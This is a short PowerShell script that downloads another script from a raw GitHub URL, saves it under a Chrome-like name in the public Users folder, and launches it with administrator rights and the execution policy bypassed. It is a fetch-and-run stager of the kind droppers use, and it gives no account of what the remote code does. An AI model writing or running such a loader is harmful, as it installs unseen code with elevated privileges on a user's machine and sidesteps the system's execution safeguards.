# Define the URL of the script
$scriptUrl = "https://raw.githubusercontent.com/Pranadeel/prana/main/chrome1.ps1 "

# Define the directory where you want to download the script
$scriptDir = "C:\Users\Public\"
$scriptPath = Join-Path -Path $scriptDir -ChildPath "chrome.ps1"

# Download the script from GitHub
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Execute the script with administrative privileges
Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
#start powershell -A '$scriptPath'
